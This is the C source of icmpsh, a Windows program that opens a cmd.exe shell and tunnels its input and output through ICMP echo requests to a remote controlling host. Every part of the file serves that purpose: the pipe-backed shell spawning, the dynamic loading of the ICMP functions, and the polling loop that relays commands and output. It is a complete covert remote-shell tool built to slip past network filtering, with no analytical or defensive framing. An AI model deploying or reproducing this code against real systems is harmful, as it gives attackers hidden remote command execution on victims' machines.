/*
 *   icmpsh - simple icmp command shell
 *   Copyright (c) 2010, Nico Leidecker <nico@leidecker.info>
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *    This program is distributed in the hope that it will be useful,
 *    but WITHOUT ANY WARRANTY; without even the implied warranty of
 *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *    GNU General Public License for more details.
 *
 *    You should have received a copy of the GNU General Public License
 *    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */


#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <winsock2.h>
#include <iphlpapi.h>

#define ICMP_HEADERS_SIZE	(sizeof(ICMP_ECHO_REPLY) + 8)

#define STATUS_OK					0
#define STATUS_SINGLE				1
#define STATUS_PROCESS_NOT_CREATED	2

#define TRANSFER_SUCCESS			1
#define TRANSFER_FAILURE			0

#define DEFAULT_TIMEOUT			    3000
#define DEFAULT_DELAY			    200
#define DEFAULT_MAX_BLANKS	   	    10
#define DEFAULT_MAX_DATA_SIZE	    64

FARPROC icmp_create, icmp_send, to_ip;

int verbose = 0;

int spawn_shell(PROCESS_INFORMATION *pi, HANDLE *out_read, HANDLE *in_write)
{
	SECURITY_ATTRIBUTES sattr;
	STARTUPINFOA si;
	HANDLE in_read, out_write;

	memset(&si, 0x00, sizeof(SECURITY_ATTRIBUTES));
	memset(pi, 0x00, sizeof(PROCESS_INFORMATION));
    
	// create communication pipes  
	memset(&sattr, 0x00, sizeof(SECURITY_ATTRIBUTES));
	sattr.nLength = sizeof(SECURITY_ATTRIBUTES); 
	sattr.bInheritHandle = TRUE; 
	sattr.lpSecurityDescriptor = NULL; 

	if (!CreatePipe(out_read, &out_write, &sattr, 0)) {
		return STATUS_PROCESS_NOT_CREATED;
	}
	if (!SetHandleInformation(*out_read, HANDLE_FLAG_INHERIT, 0)) {
		return STATUS_PROCESS_NOT_CREATED;
	}

	if (!CreatePipe(&in_read, in_write, &sattr, 0)) {
		return STATUS_PROCESS_NOT_CREATED;
	}
	if (!SetHandleInformation(*in_write, HANDLE_FLAG_INHERIT, 0)) {
		return STATUS_PROCESS_NOT_CREATED;
	}

	// spawn process
	memset(&si, 0x00, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO); 
	si.hStdError = out_write;
	si.hStdOutput = out_write;
	si.hStdInput = in_read;
	si.dwFlags |= STARTF_USESTDHANDLES;

	if (!CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA) &si, pi)) {
		return STATUS_PROCESS_NOT_CREATED;
	}

	CloseHandle(out_write);
	CloseHandle(in_read);

	return STATUS_OK;
}

void usage(char *path)
{
	printf("%s [options] -t target\n", path);
	printf("options:\n");
	printf("  -t host            host ip address to send ping requests to\n");
	printf("  -r                 send a single test icmp request and then quit\n");
	printf("  -d milliseconds    delay between requests in milliseconds (default is %u)\n", DEFAULT_DELAY);
	printf("  -o milliseconds    timeout in milliseconds\n");
	printf("  -h                 this screen\n");
	printf("  -b num             maximal number of blanks (unanswered icmp requests)\n");
    printf("                     before quitting\n");
	printf("  -s bytes           maximal data buffer size in bytes (default is 64 bytes)\n\n", DEFAULT_MAX_DATA_SIZE);
	printf("In order to improve the speed, lower the delay (-d) between requests or\n");
    printf("increase the size (-s) of the data buffer\n");
}

void create_icmp_channel(HANDLE *icmp_chan)
{
	// create icmp file
	*icmp_chan = (HANDLE) icmp_create();
}

int transfer_icmp(HANDLE icmp_chan, unsigned int target, char *out_buf, unsigned int out_buf_size, char *in_buf, unsigned int *in_buf_size, unsigned int max_in_data_size, unsigned int timeout)
{
	int rs;
	char *temp_in_buf;
	int nbytes;

	PICMP_ECHO_REPLY echo_reply;

	temp_in_buf = (char *) malloc(max_in_data_size + ICMP_HEADERS_SIZE);
	if (!temp_in_buf) {
		return TRANSFER_FAILURE;
	}

	// send data to remote host
	rs = icmp_send(
			icmp_chan,
			target,
			out_buf,
			out_buf_size,
			NULL,
			temp_in_buf,
			max_in_data_size + ICMP_HEADERS_SIZE,
			timeout);

		// check received data
		if (rs > 0) {
			echo_reply = (PICMP_ECHO_REPLY) temp_in_buf;
			if (echo_reply->DataSize > max_in_data_size) {
				nbytes = max_in_data_size;
			} else {
				nbytes = echo_reply->DataSize;
			}
			memcpy(in_buf, echo_reply->Data, nbytes);
			*in_buf_size = nbytes;

			free(temp_in_buf);
			return TRANSFER_SUCCESS;
		}

		free(temp_in_buf);

    return TRANSFER_FAILURE;
}

int load_deps()
{
	HMODULE lib;
	
	lib = LoadLibraryA("ws2_32.dll");
	if (lib != NULL) {
        to_ip = GetProcAddress(lib, "inet_addr");
        if (!to_ip) {   
            return 0;
        }
    }

	lib = LoadLibraryA("iphlpapi.dll");
	if (lib != NULL) {
		icmp_create = GetProcAddress(lib, "IcmpCreateFile");
		icmp_send = GetProcAddress(lib, "IcmpSendEcho");
		if (icmp_create && icmp_send) {
			return 1;
		}
	} 

	lib = LoadLibraryA("ICMP.DLL");
	if (lib != NULL) {
		icmp_create = GetProcAddress(lib, "IcmpCreateFile");
		icmp_send = GetProcAddress(lib, "IcmpSendEcho");
		if (icmp_create && icmp_send) {
			return 1;
		}
	}
	
	printf("failed to load functions (%u)", GetLastError());

	return 0;
}
int main(int argc, char **argv)
{
	int opt;
	char *target;
	unsigned int delay, timeout;
	unsigned int ip_addr;
	HANDLE pipe_read, pipe_write;
	HANDLE icmp_chan;
	unsigned char *in_buf, *out_buf;
	unsigned int in_buf_size, out_buf_size;
	DWORD rs;
	int blanks, max_blanks;
	PROCESS_INFORMATION pi;
	int status;
	unsigned int max_data_size;
	struct hostent *he;


	// set defaults
	target = 0;
	timeout = DEFAULT_TIMEOUT;
	delay = DEFAULT_DELAY;
	max_blanks = DEFAULT_MAX_BLANKS;
	max_data_size = DEFAULT_MAX_DATA_SIZE;

	status = STATUS_OK;
	if (!load_deps()) {
		printf("failed to load ICMP library\n");
		return -1;
	}

	// parse command line options
	for (opt = 1; opt < argc; opt++) {
		if (argv[opt][0] == '-') {
			switch(argv[opt][1]) {
				case 'h':
				    usage(*argv);
					return 0;
				case 't':
					if (opt + 1 < argc) {
						target = argv[opt + 1];
					}
					break;
				case 'd':
					if (opt + 1 < argc) {
						delay = atol(argv[opt + 1]);
					}
					break;
				case 'o':
					if (opt + 1 < argc) {
						timeout = atol(argv[opt + 1]);
					}
					break;
				case 'r':
					status = STATUS_SINGLE;
					break;
				case 'b':
					if (opt + 1 < argc) {
						max_blanks = atol(argv[opt + 1]);
					}
					break;
				case 's':
					if (opt + 1 < argc) {
						max_data_size = atol(argv[opt + 1]);
					}
					break;
				default:
					printf("unrecognized option -%c\n", argv[1][0]);
					usage(*argv);
					return -1;
			}
		}
	}

	if (!target) {
		printf("you need to specify a host with -t. Try -h for more options\n");
		return -1;
	}
	ip_addr = to_ip(target);

	// don't spawn a shell if we're only sending a single test request
	if (status != STATUS_SINGLE) {
		status = spawn_shell(&pi, &pipe_read, &pipe_write);
	}

	// create icmp channel
	create_icmp_channel(&icmp_chan);
	if (icmp_chan == INVALID_HANDLE_VALUE) {
	    printf("unable to create ICMP file: %u\n", GetLastError());
	    return -1;
	}

	// allocate transfer buffers
	in_buf = (char *) malloc(max_data_size + ICMP_HEADERS_SIZE);
	out_buf = (char *) malloc(max_data_size + ICMP_HEADERS_SIZE);
	if (!in_buf || !out_buf) {
		printf("failed to allocate memory for transfer buffers\n");
		return -1;
	}
	memset(in_buf, 0x00, max_data_size + ICMP_HEADERS_SIZE);
	memset(out_buf, 0x00, max_data_size + ICMP_HEADERS_SIZE);

	// sending/receiving loop
	blanks = 0;
	do {

		switch(status) {
			case STATUS_SINGLE:
				// reply with a static string
				out_buf_size = sprintf(out_buf, "Test1234\n");
				break;
			case STATUS_PROCESS_NOT_CREATED:
				// reply with error message
				out_buf_size = sprintf(out_buf, "Process was not created\n");
				break;
			default:
				// read data from process via pipe
				out_buf_size = 0;
				if (PeekNamedPipe(pipe_read, NULL, 0, NULL, &out_buf_size, NULL)) {
					if (out_buf_size > 0) {
						out_buf_size = 0;
						rs = ReadFile(pipe_read, out_buf, max_data_size, &out_buf_size, NULL);
						if (!rs && GetLastError() != ERROR_IO_PENDING) {
							out_buf_size = sprintf(out_buf, "Error: ReadFile failed with %i\n", GetLastError());
						} 
					}
				} else {
					out_buf_size = sprintf(out_buf, "Error: PeekNamedPipe failed with %i\n", GetLastError());
				}
				break;
		}

		// send request/receive response
		if (transfer_icmp(icmp_chan, ip_addr, out_buf, out_buf_size, in_buf, &in_buf_size,  max_data_size, timeout) == TRANSFER_SUCCESS) {
			if (status == STATUS_OK) {
				// write data from response back into pipe
				WriteFile(pipe_write, in_buf, in_buf_size, &rs, 0);
			}
			blanks = 0;
		} else {
			// no reply received or error occured
			blanks++;
		}

		// wait between requests
		Sleep(delay);

	} while (status == STATUS_OK && blanks < max_blanks);

	if (status == STATUS_OK) {
		TerminateProcess(pi.hProcess, 0);
	}

    return 0;
}

